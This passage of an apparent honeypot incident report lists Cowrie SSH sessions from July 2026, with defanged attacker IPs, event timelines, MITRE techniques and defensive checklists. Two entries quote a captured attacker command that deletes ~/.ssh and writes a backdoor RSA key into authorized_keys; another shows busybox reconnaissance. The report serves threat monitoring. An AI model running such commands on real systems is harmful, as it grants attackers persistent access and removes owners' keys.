- [ ] Submit `112.161.26[.]125` to AbuseIPDB if not already reported
- [ ] Block `112.161.26[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67e009a7fbc7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-26 11:14 |
| **Last Seen** | 2026-07-26 11:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:14:29` | `cowrie.session.connect` |
| `2026-07-26 11:14:29` | `cowrie.client.version` |
| `2026-07-26 11:14:29` | `cowrie.client.kex` |
| `2026-07-26 11:14:29` | `cowrie.login.success` |
| `2026-07-26 11:14:29` | `cowrie.direct-tcpip.request` |
| `2026-07-26 11:14:29` | `cowrie.direct-tcpip.data` |
| `2026-07-26 11:14:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f55b4ba1538

| Field | Detail |
|---|---|
| **Source IP** | `112.31.167[.]120` |
| **First Seen** | 2026-07-26 11:14 |
| **Last Seen** | 2026-07-26 11:15 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:14:54` | `cowrie.session.connect` |
| `2026-07-26 11:14:54` | `cowrie.client.version` |
| `2026-07-26 11:14:54` | `cowrie.client.kex` |
| `2026-07-26 11:14:57` | `cowrie.login.success` |
| `2026-07-26 11:14:58` | `cowrie.direct-tcpip.request` |
| `2026-07-26 11:15:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.31.167[.]120` to AbuseIPDB if not already reported
- [ ] Block `112.31.167[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf053d2c17ac

| Field | Detail |
|---|---|
| **Source IP** | `153.66.28[.]132` |
| **First Seen** | 2026-07-26 11:15 |
| **Last Seen** | 2026-07-26 11:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:15:00` | `cowrie.session.connect` |
| `2026-07-26 11:15:00` | `cowrie.client.version` |
| `2026-07-26 11:15:00` | `cowrie.client.kex` |
| `2026-07-26 11:15:00` | `cowrie.login.success` |
| `2026-07-26 11:15:01` | `cowrie.session.params` |
| `2026-07-26 11:15:01` | `cowrie.command.input` |
| `2026-07-26 11:15:01` | `cowrie.command.failed` |
| `2026-07-26 11:15:01` | `cowrie.log.closed` |
| `2026-07-26 11:15:02` | `cowrie.session.params` |
| `2026-07-26 11:15:02` | `cowrie.command.input` |
| `2026-07-26 11:15:02` | `cowrie.session.file_download` |
| `2026-07-26 11:15:02` | `cowrie.log.closed` |
| `2026-07-26 11:15:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.66.28[.]132` to AbuseIPDB if not already reported
- [ ] Block `153.66.28[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c239eb348a0

| Field | Detail |
|---|---|
| **Source IP** | `153.66.28[.]132` |
| **First Seen** | 2026-07-26 11:15 |
| **Last Seen** | 2026-07-26 11:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:15:02` | `cowrie.session.connect` |
| `2026-07-26 11:15:02` | `cowrie.client.version` |
| `2026-07-26 11:15:02` | `cowrie.client.kex` |
| `2026-07-26 11:15:03` | `cowrie.login.success` |
| `2026-07-26 11:15:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.66.28[.]132` to AbuseIPDB if not already reported
- [ ] Block `153.66.28[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b635c5c37d26

| Field | Detail |
|---|---|
| **Source IP** | `153.66.28[.]132` |
| **First Seen** | 2026-07-26 11:15 |
| **Last Seen** | 2026-07-26 11:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:15:03` | `cowrie.session.connect` |
| `2026-07-26 11:15:03` | `cowrie.client.version` |
| `2026-07-26 11:15:03` | `cowrie.client.kex` |
| `2026-07-26 11:15:03` | `cowrie.login.success` |
| `2026-07-26 11:15:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.66.28[.]132` to AbuseIPDB if not already reported
- [ ] Block `153.66.28[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ad824868f2d

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-07-26 11:15 |
| **Last Seen** | 2026-07-26 11:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:15:04` | `cowrie.session.connect` |
| `2026-07-26 11:15:04` | `cowrie.client.version` |
| `2026-07-26 11:15:04` | `cowrie.client.kex` |
| `2026-07-26 11:15:05` | `cowrie.login.success` |
| `2026-07-26 11:15:06` | `cowrie.direct-tcpip.request` |
| `2026-07-26 11:15:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a46ac3d65a6e

| Field | Detail |
|---|---|
| **Source IP** | `187.126.105[.]42` |
| **First Seen** | 2026-07-26 11:28 |
| **Last Seen** | 2026-07-26 11:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:28:01` | `cowrie.session.connect` |
| `2026-07-26 11:28:02` | `cowrie.client.version` |
| `2026-07-26 11:28:02` | `cowrie.client.kex` |
| `2026-07-26 11:28:04` | `cowrie.login.success` |
| `2026-07-26 11:28:04` | `cowrie.direct-tcpip.request` |
| `2026-07-26 11:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.126.105[.]42` to AbuseIPDB if not already reported
- [ ] Block `187.126.105[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-751f5cd929c1

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-26 11:31 |
| **Last Seen** | 2026-07-26 11:31 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:31:25` | `cowrie.session.connect` |
| `2026-07-26 11:31:26` | `cowrie.client.version` |
| `2026-07-26 11:31:26` | `cowrie.client.kex` |
| `2026-07-26 11:31:29` | `cowrie.login.success` |
| `2026-07-26 11:31:30` | `cowrie.direct-tcpip.request` |
| `2026-07-26 11:31:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-553db299dbd2

| Field | Detail |
|---|---|
| **Source IP** | `47.253.5[.]130` |
| **First Seen** | 2026-07-26 11:32 |
| **Last Seen** | 2026-07-26 11:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:32:13` | `cowrie.session.connect` |
| `2026-07-26 11:32:13` | `cowrie.client.version` |
| `2026-07-26 11:32:13` | `cowrie.client.kex` |
| `2026-07-26 11:32:13` | `cowrie.login.success` |
| `2026-07-26 11:32:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.253.5[.]130` to AbuseIPDB if not already reported
- [ ] Block `47.253.5[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfec34ad9809

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-26 11:32 |
| **Last Seen** | 2026-07-26 11:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:32:13` | `cowrie.session.connect` |
| `2026-07-26 11:32:13` | `cowrie.client.version` |
| `2026-07-26 11:32:13` | `cowrie.client.kex` |
| `2026-07-26 11:32:14` | `cowrie.login.success` |
| `2026-07-26 11:32:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-259ef6ac0d57

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-07-26 11:36 |
| **Last Seen** | 2026-07-26 11:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:36:02` | `cowrie.session.connect` |
| `2026-07-26 11:36:02` | `cowrie.client.version` |
| `2026-07-26 11:36:02` | `cowrie.client.kex` |
| `2026-07-26 11:36:03` | `cowrie.login.success` |
| `2026-07-26 11:36:03` | `cowrie.direct-tcpip.request` |
| `2026-07-26 11:36:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e0e2412335d

| Field | Detail |
|---|---|
| **Source IP** | `223.100.248[.]64` |
| **First Seen** | 2026-07-26 11:36 |
| **Last Seen** | 2026-07-26 11:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:36:09` | `cowrie.session.connect` |
| `2026-07-26 11:36:09` | `cowrie.client.version` |
| `2026-07-26 11:36:09` | `cowrie.client.kex` |
| `2026-07-26 11:36:13` | `cowrie.login.success` |
| `2026-07-26 11:36:13` | `cowrie.direct-tcpip.request` |
| `2026-07-26 11:36:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.100.248[.]64` to AbuseIPDB if not already reported
- [ ] Block `223.100.248[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d96737101f18

| Field | Detail |
|---|---|
| **Source IP** | `189.52.52[.]162` |
| **First Seen** | 2026-07-26 11:39 |
| **Last Seen** | 2026-07-26 11:39 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:39:35` | `cowrie.session.connect` |
| `2026-07-26 11:39:36` | `cowrie.client.version` |
| `2026-07-26 11:39:36` | `cowrie.client.kex` |
| `2026-07-26 11:39:40` | `cowrie.login.success` |
| `2026-07-26 11:39:40` | `cowrie.direct-tcpip.request` |
| `2026-07-26 11:39:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.52.52[.]162` to AbuseIPDB if not already reported
- [ ] Block `189.52.52[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-502324e41154

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-07-26 11:42 |
| **Last Seen** | 2026-07-26 11:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:42:05` | `cowrie.session.connect` |
| `2026-07-26 11:42:05` | `cowrie.client.version` |
| `2026-07-26 11:42:05` | `cowrie.client.kex` |
| `2026-07-26 11:42:06` | `cowrie.login.success` |
| `2026-07-26 11:42:06` | `cowrie.session.params` |
| `2026-07-26 11:42:06` | `cowrie.command.input` |
| `2026-07-26 11:42:06` | `cowrie.command.failed` |
| `2026-07-26 11:42:07` | `cowrie.log.closed` |
| `2026-07-26 11:42:07` | `cowrie.session.params` |
| `2026-07-26 11:42:07` | `cowrie.command.input` |
| `2026-07-26 11:42:07` | `cowrie.session.file_download` |
| `2026-07-26 11:42:07` | `cowrie.log.closed` |
| `2026-07-26 11:42:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afd99250056f

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-07-26 11:42 |
| **Last Seen** | 2026-07-26 11:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:42:07` | `cowrie.session.connect` |
| `2026-07-26 11:42:07` | `cowrie.client.version` |
| `2026-07-26 11:42:08` | `cowrie.client.kex` |
| `2026-07-26 11:42:08` | `cowrie.login.success` |
| `2026-07-26 11:42:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaf91d65f298

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-07-26 11:42 |
| **Last Seen** | 2026-07-26 11:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:42:08` | `cowrie.session.connect` |
| `2026-07-26 11:42:08` | `cowrie.client.version` |
| `2026-07-26 11:42:08` | `cowrie.client.kex` |
| `2026-07-26 11:42:09` | `cowrie.login.success` |
| `2026-07-26 11:42:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19a9d48d3a43

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]210` |
| **First Seen** | 2026-07-26 11:46 |
| **Last Seen** | 2026-07-26 11:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:46:13` | `cowrie.session.connect` |
| `2026-07-26 11:46:14` | `cowrie.login.success` |
| `2026-07-26 11:46:14` | `cowrie.session.params` |
| `2026-07-26 11:46:15` | `cowrie.command.input` |
| `2026-07-26 11:46:15` | `cowrie.command.input` |
| `2026-07-26 11:46:16` | `cowrie.command.input` |
| `2026-07-26 11:46:16` | `cowrie.command.input` |
| `2026-07-26 11:46:16` | `cowrie.command.failed` |
| `2026-07-26 11:46:17` | `cowrie.log.closed` |
| `2026-07-26 11:46:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]210` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46d23022776b

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-26 11:51 |
| **Last Seen** | 2026-07-26 11:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:51:57` | `cowrie.session.connect` |
| `2026-07-26 11:51:57` | `cowrie.client.version` |
| `2026-07-26 11:51:57` | `cowrie.client.kex` |
| `2026-07-26 11:51:58` | `cowrie.login.success` |
| `2026-07-26 11:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef76183786b2

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-26 11:51 |
| **Last Seen** | 2026-07-26 11:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:51:57` | `cowrie.session.connect` |
| `2026-07-26 11:51:57` | `cowrie.client.version` |
| `2026-07-26 11:51:58` | `cowrie.client.kex` |
| `2026-07-26 11:51:58` | `cowrie.login.success` |
| `2026-07-26 11:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-792bfb824fe6

| Field | Detail |
|---|---|
| **Source IP** | `124.152.90[.]68` |
| **First Seen** | 2026-07-26 11:56 |
| **Last Seen** | 2026-07-26 11:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:56:02` | `cowrie.session.connect` |
| `2026-07-26 11:56:03` | `cowrie.client.version` |
| `2026-07-26 11:56:03` | `cowrie.client.kex` |
| `2026-07-26 11:56:04` | `cowrie.login.success` |
| `2026-07-26 11:56:05` | `cowrie.direct-tcpip.request` |
| `2026-07-26 11:56:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.152.90[.]68` to AbuseIPDB if not already reported
- [ ] Block `124.152.90[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-503ff9007e45

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]10` |
| **First Seen** | 2026-07-26 11:59 |
| **Last Seen** | 2026-07-26 11:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 11:59:22` | `cowrie.session.connect` |
| `2026-07-26 11:59:23` | `cowrie.client.version` |
| `2026-07-26 11:59:23` | `cowrie.client.kex` |
| `2026-07-26 11:59:24` | `cowrie.login.success` |
| `2026-07-26 11:59:25` | `cowrie.direct-tcpip.request` |
| `2026-07-26 11:59:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]10` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41064c20cd15

| Field | Detail |
|---|---|
| **Source IP** | `112.31.93[.]229` |
| **First Seen** | 2026-07-26 12:00 |
| **Last Seen** | 2026-07-26 12:01 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 12:00:47` | `cowrie.session.connect` |
| `2026-07-26 12:00:48` | `cowrie.client.version` |
| `2026-07-26 12:00:48` | `cowrie.client.kex` |
| `2026-07-26 12:00:55` | `cowrie.login.success` |
| `2026-07-26 12:00:56` | `cowrie.direct-tcpip.request` |
| `2026-07-26 12:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.31.93[.]229` to AbuseIPDB if not already reported
- [ ] Block `112.31.93[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45a0790d2f6e

| Field | Detail |
|---|---|
| **Source IP** | `67.85.146[.]216` |
| **First Seen** | 2026-07-26 12:04 |
| **Last Seen** | 2026-07-26 12:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 12:04:16` | `cowrie.session.connect` |
| `2026-07-26 12:04:17` | `cowrie.client.version` |
| `2026-07-26 12:04:17` | `cowrie.client.kex` |
| `2026-07-26 12:04:18` | `cowrie.login.success` |
| `2026-07-26 12:04:18` | `cowrie.direct-tcpip.request` |
| `2026-07-26 12:04:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `67.85.146[.]216` to AbuseIPDB if not already reported
- [ ] Block `67.85.146[.]216` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9a5b7ba2fde

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-26 12:12 |
| **Last Seen** | 2026-07-26 12:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 12:12:11` | `cowrie.session.connect` |
| `2026-07-26 12:12:11` | `cowrie.client.version` |
| `2026-07-26 12:12:11` | `cowrie.client.kex` |
| `2026-07-26 12:12:11` | `cowrie.login.success` |
| `2026-07-26 12:12:11` | `cowrie.direct-tcpip.request` |
| `2026-07-26 12:12:12` | `cowrie.direct-tcpip.data` |
| `2026-07-26 12:12:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d2f4a41ce63

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]92` |
| **First Seen** | 2026-07-26 12:17 |
| **Last Seen** | 2026-07-26 12:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
